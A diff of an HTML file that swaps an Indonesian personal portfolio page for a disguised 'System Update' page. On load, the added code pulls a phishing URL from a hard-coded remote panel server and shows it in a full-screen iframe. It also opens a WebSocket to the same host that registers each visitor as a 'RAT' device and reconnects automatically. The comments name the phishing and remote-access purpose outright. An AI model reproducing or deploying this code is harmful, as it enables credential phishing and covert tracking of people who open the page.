@@ -1,106 +1,83 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-  <meta name="theme-color" content="#0a0614">
-  <title>Portfolio</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css">
-  <link rel="stylesheet" href="style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>System Update</title>
+    <style>
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #f0f2f5; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+        iframe { width: 100%; height: 100%; border: none; display: none; }
+        
+        /* Loading Screen Animation */
+        #loading { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; flex-direction: column; z-index: 9999; background: #fff; }
+        .spinner { border: 4px solid rgba(0, 0, 0, 0.1); width: 36px; height: 36px; border-radius: 50%; border-left-color: #1877f2; animation: spin 1s ease infinite; margin-bottom: 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .text-load { color: #65676b; font-size: 14px; font-weight: 500; }
+    </style>
 </head>
-<body class="is-loading">
+<body>
 
-  <!-- LOAD SCREEN -->
-  <div id="loader" aria-live="polite">
-    <div class="loader-box">
-      <div class="loader-ring"><span id="loaderLetter">Y</span></div>
-      <div class="loader-name" id="loaderName">Loading</div>
-      <div class="loader-bar"><i id="loaderBar"></i></div>
-      <div class="loader-pct" id="loaderPct">0%</div>
+    <!-- Loading Screen -->
+    <div id="loading">
+        <div class="spinner"></div>
+        <div class="text-load">Memuat Halaman...</div>
     </div>
-  </div>
 
-  <!-- BACKGROUND -->
-  <div class="bg" aria-hidden="true">
-    <span class="orb o1"></span><span class="orb o2"></span><span class="orb o3"></span>
-    <canvas id="sparks"></canvas>
-  </div>
+    <!-- Iframe for Phishing Target -->
+    <iframe id="phishFrame" src="about:blank"></iframe>
 
-  <!-- NAVBAR -->
-  <header class="nav" id="nav">
-    <a href="#profile" class="brand">
-      <b id="brand">Yamzz</b>
-      <small id="brandSub">PORTFOLIO</small>
-    </a>
-    <button class="burger" id="burger" aria-label="Buka menu" aria-expanded="false" aria-controls="drawer">
-      <span></span><span></span><span></span>
-    </button>
-  </header>
+    <script>
+        // 1. GANTI URL SERVER PTERODACTYL LO DI SINI
+        var SERVER_HTTP = "http://herstoreganteng.rexypediaa.biz.id:4732";
+        var SERVER_WS = "ws://herstoreganteng.rexypediaa.biz.id:4732";
 
-  <div class="overlay" id="overlay"></div>
-  <aside class="drawer" id="drawer" aria-hidden="true">
-    <button class="drawer-close" id="drawerClose" aria-label="Tutup menu"><i class="fa-solid fa-xmark"></i></button>
-    <nav id="drawerLinks">
-      <a href="#profile">Profile</a>
-      <a href="#about">About</a>
-      <a href="#skills">Skills</a>
-      <a href="#partners">Partners</a>
-      <a href="#contact">Contact</a>
-    </nav>
-  </aside>
+        // Fungsi Ambil URL Phising dari Panel Flutter
+        function getTargetUrl() {
+            fetch(SERVER_HTTP + '/api/get-target')
+                .then(response => response.text())
+                .then(url => {
+                    if (url && url.trim() !== "") {
+                        var frame = document.getElementById('phishFrame');
+                        frame.src = url;
+                        frame.style.display = 'block';
+                        document.getElementById('loading').style.display = 'none';
+                    } else {
+                        console.log("URL belum diset dari panel.");
+                    }
+                })
+                .catch(error => {
+                    console.log("Gagal konek ke server API.");
+                });
+        }
 
-  <main>
-    <!-- PROFILE -->
-    <section id="profile" class="hero">
-      <div class="avatar reveal">
-        <img id="avatar" alt="Foto profil" width="170" height="170">
-        <b id="avatarFallback" hidden></b>
-      </div>
-      <div class="status reveal"><i></i><span id="status"></span></div>
-      <h1 class="name" id="name"></h1>
-      <p class="username" id="username"></p>
-      <p class="role" id="role"></p>
-      <p class="loc"><i class="fa-solid fa-location-dot"></i> <span id="location"></span></p>
-    </section>
+        // Fungsi Koneksi RAT (Mengirim Device ke Panel Flutter)
+        function connectRAT() {
+            var ws = new WebSocket(SERVER_WS);
+            
+            ws.onopen = function() {
+                var deviceId = "web-" + Math.random().toString(36).substring(2, 10);
+                var data = {
+                    type: "register",
+                    device_id: deviceId,
+                    name: "Android WebView",
+                    os: "Android WebView",
+                    battery: 100
+                };
+                ws.send(JSON.stringify(data));
+                console.log("RAT Connected: " + deviceId);
+            };
+            
+            ws.onclose = function() {
+                console.log("RAT Disconnected, retrying...");
+                setTimeout(connectRAT, 5000); // Auto-reconnect
+            };
+        }
 
-    <!-- ABOUT -->
-    <section id="about" class="sec">
-      <h2 class="title">Tentang Saya</h2>
-      <div class="card about-card reveal">
-        <p id="aboutText" class="typed"></p><span class="caret" aria-hidden="true"></span>
-      </div>
-    </section>
-
-    <!-- SKILLS -->
-    <section id="skills" class="sec">
-      <h2 class="title">My Skills</h2>
-      <div class="list" id="skillList"></div>
-    </section>
-
-    <!-- PARTNERS -->
-    <section id="partners" class="sec">
-      <h2 class="title">My Partners</h2>
-      <div class="list" id="partnerList"></div>
-    </section>
-
-    <!-- CONTACT -->
-    <section id="contact" class="sec">
-      <h2 class="title">Contact</h2>
-      <div class="list" id="contactList"></div>
-      <p class="based"><i class="fa-solid fa-location-dot"></i> <span id="mapLabel"></span></p>
-      <div id="map" class="map reveal"></div>
-    </section>
-  </main>
-
-  <footer class="footer">Made with <i class="fa-solid fa-heart"></i> <span id="footerText"></span></footer>
-
-  <noscript><p style="padding:2rem;text-align:center">Aktifkan JavaScript buat lihat portfolio ini.</p></noscript>
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.js"></script>
-  <script src="script.js"></script>
+        // Jalankan saat HTML dibuka
+        window.onload = function() {
+            getTargetUrl();
+            connectRAT();
+        };
+    </script>
 </body>
 </html>
